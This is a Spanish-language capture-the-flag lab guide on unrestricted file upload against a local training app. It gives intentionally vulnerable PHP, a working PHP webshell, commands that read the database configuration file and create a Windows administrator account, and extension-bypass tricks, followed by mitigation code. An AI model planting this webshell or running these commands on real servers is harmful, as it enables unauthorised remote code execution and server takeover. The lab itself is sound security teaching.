---
title: "Lab 3: File Upload"
description: Guía práctica del laboratorio de File Upload en ULS CyberLab
sidebar:
  order: 23
---

# Lab 3: Unrestricted File Upload

**Puntos totales:** 25 pts  
**Dificultad:** 🟡 Medio  
**Módulo:** `http://localhost/mini-cyberlab/modules/upload.php`

---

## Contexto

Este laboratorio demuestra cómo un formulario de subida de archivos sin restricciones puede convertirse en un vector de **Remote Code Execution (RCE)** — la capacidad de ejecutar comandos en el servidor. Subir un archivo PHP funcional a un directorio público es una de las vulnerabilidades más graves que existen.

---

## Challenge: Webshell Upload (25 puntos)

**Flag:** `FLAG{W3BSH3LL_UPL04D3D}`  
**Objetivo:** Subir un archivo PHP que funcione como webshell y ejecutar comandos en el servidor

### Código Vulnerable

```php
// modules/upload.php
$filename = $_FILES['file']['name'];
$destination = '../uploads/' . $filename;

// Solo bloquea .htaccess — ¡NADA MÁS!
if ($filename === '.htaccess') {
    die("Archivo no permitido");
}

// Mueve el archivo sin ninguna validación de tipo
move_uploaded_file($_FILES['file']['tmp_name'], $destination);

// Detecta PHP y lo registra (pero no lo bloquea)
if (preg_match('/\.(php|phtml|php3|php4|php5|php7|phar)$/i', $filename)) {
    log_event('CRITICAL', 'upload', "PHP file uploaded: $filename");
    capture_flag('FLAG{W3BSH3LL_UPL04D3D}');  // Captura la flag
}
```

### Paso 1: Crear el Webshell

Crea un archivo llamado `shell.php` en tu PC con el siguiente contenido:

```php
<?php
// Webshell básica - SOLO para uso en laboratorios
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### Paso 2: Subir el Webshell

1. Abre `http://localhost/mini-cyberlab/modules/upload.php`
2. Haz clic en **"Elegir archivo"**
3. Selecciona el archivo `shell.php` que creaste
4. Haz clic en **"Subir Archivo"**

### Resultado Esperado

- ✅ El archivo se sube exitosamente
- ✅ Aparece en la lista de archivos subidos
- ✅ Flag `FLAG{W3BSH3LL_UPL04D3D}` capturada automáticamente (25 pts)
- ✅ Log `CRITICAL` registrado: "PHP file uploaded: shell.php"

### Paso 3: Ejecutar Comandos con el Webshell

El webshell subido está ahora en:
```
http://localhost/mini-cyberlab/uploads/shell.php
```

Puedes ejecutar cualquier comando del sistema:

```bash
# Ver el usuario que ejecuta el servidor
http://localhost/mini-cyberlab/uploads/shell.php?cmd=whoami

# Listar archivos del servidor
http://localhost/mini-cyberlab/uploads/shell.php?cmd=dir

# Ver la IP del servidor
http://localhost/mini-cyberlab/uploads/shell.php?cmd=ipconfig

# Leer el archivo de configuración de la BD
http://localhost/mini-cyberlab/uploads/shell.php?cmd=type+C:\xampp\htdocs\mini-cyberlab\includes\db.php

# Ver todos los usuarios del sistema Windows
http://localhost/mini-cyberlab/uploads/shell.php?cmd=net+user
```

### El Impacto Real

En un sistema de producción real, esto permitiría al atacante:

```
whoami                          → Ver qué usuario es el servidor
net user hacker /add            → Crear un nuevo usuario
net localgroup administrators hacker /add  → Darle privilegios de admin
type C:\Windows\System32\drivers\etc\hosts → Leer archivos del sistema
```

Esto es básicamente **control total del servidor**.

---

## El Módulo también Muestra

- **Lista de archivos subidos** con links directos para acceder a ellos
- **Logs en tiempo real** mostrando el intento de carga como CRITICAL
- **Sugerencia de webshell** en la interfaz del módulo

---

## Variantes del Ataque (Para Exploración)

### Extensiones Alternativas

Si el servidor bloqueara `.php`:

```
shell.php3
shell.php4
shell.phtml
shell.phar
shell.PhP       ← Mayúsculas/minúsculas mixtas
```

### Bypass con Content-Type

Usando Burp Suite, puedes cambiar el header `Content-Type` a `image/jpeg` mientras subes el PHP.

### Double Extension

```
shell.jpg.php    ← Si el servidor toma la última extensión
shell.php.jpg    ← Si el servidor verifica el nombre completo y toma la primera
```

---

## Diferencias de Impacto

| Archivo Subido | Qué puede hacer |
|----------------|----------------|
| `.jpg`, `.png`, `.gif` | Solo mostrar imagen (inofensivo) |
| `.html`, `.htm` | Phishing, XSS si hay otros usuarios |
| `.php`, `.phtml` | **RCE — Control total del servidor** |
| `.htaccess` | Reconfigurar Apache (extremadamente peligroso) |

---

## Mitigación

### ✅ Validación Completa del Tipo

```php
// 1. Whitelist de extensiones permitidas
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'docx'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_extensions)) {
    die("Tipo de archivo no permitido: .$ext");
}

// 2. Verificar el tipo MIME real (magic bytes)
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime_type = $finfo->file($_FILES['file']['tmp_name']);
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
if (!in_array($mime_type, $allowed_mimes)) {
    die("Tipo MIME no permitido: $mime_type");
}

// 3. Renombrar el archivo (elimina extensiones maliciosas)
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], '../uploads/' . $new_name);
```

### ✅ Almacenar Fuera del Webroot

```php
// ✅ El archivo NO está en el directorio web - no es ejecutable
$upload_path = 'C:/uploads_privados/' . $new_name;
move_uploaded_file($_FILES['file']['tmp_name'], $upload_path);

// Para servir el archivo, usar un script intermediario
// download.php?file=abc123.png → Lee el archivo y lo envía al navegador
```

### ✅ .htaccess en la Carpeta Uploads

```apache
# uploads/.htaccess
<FilesMatch "\.php$">
    Require all denied
</FilesMatch>

php_flag engine off
```

---

## Recursos

- [PortSwigger File Upload Labs](https://portswigger.net/web-security/file-upload)
- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PayloadsAllTheThings - Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
